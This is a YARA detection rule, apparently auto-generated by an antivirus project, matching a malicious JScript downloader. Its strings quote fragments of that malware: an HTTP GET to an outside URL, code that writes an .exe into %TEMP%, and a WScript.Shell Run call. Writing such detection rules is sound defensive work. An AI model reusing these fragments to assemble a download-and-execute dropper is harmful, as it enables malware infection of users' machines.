rule sig_20160328_fd7e3b130ae97f20741e85430ba92488 {
  meta:
    description = "datamaliciousorder - file 20160328_fd7e3b130ae97f20741e85430ba92488.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "544b019e1a52d98cf12b5337c2305737f43f43f722f1e61f7fa3dd0b4a98b606"

  strings:
    $s1  = "function Kthuuyvszj() {return Mbsckgeoow[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"pa6c1SQrJlIV5TtA.exe\";};" fullword ascii
    $s2  = "do {WScript[Clqjrzi](Hhgzbrmau() * 11)} while (Nwkzrpmjy[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Nwkzrpmjy[Sfeyknbt](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s4  = "function Geyci(Tillr, Pizmkazpa){return Tillr - Pizmkazpa;};" fullword ascii
    $s5  = "var Mbsckgeoow = function Mweldud() {return WScript[Bstslebl](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Itjsbtbwx(Hduepp){Mbsckgeoow[\"Run\"](Hduepp, Fdhypd, Fdhypd);};" fullword ascii
    $s7  = "function Myjjwrlztm() {return ((Kocqowa == true) && (Kocqowa == Wmbggu)) ? 1 : Fdhypd;};" fullword ascii
    $s8  = " while (Nosrborwaw){" fullword ascii
    $s9  = "function Hhgzbrmau(){return 22;};" fullword ascii
    $s10 = "var Huwcjeypbi = false;" fullword ascii
    $s11 = "Wmbggu = true; " fullword ascii
    $s12 = "return Geyci(Jgfgfuyf, Pwjmigudsg);" fullword ascii
    $s13 = "var Wmbggu = false;" fullword ascii
    $s14 = "function Mnmuwza(){return Unkuqut;};" fullword ascii
    $s15 = "function Myejljenrp(Nnpft) {var Hsnyrzyyjc = (1, 2, 3, 4, 5, Nnpft); return Hsnyrzyyjc;};" fullword ascii
    $s16 = "var Kocqowa = false;" fullword ascii
    $s17 = "Kocqowa = true; " fullword ascii
    $s18 = "function Srhpq()" fullword ascii
    $s19 = "var Tttebt = new this[\"Date\"]();" fullword ascii
    $s20 = "function Ygsiobkhii(){return Bstslebl;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}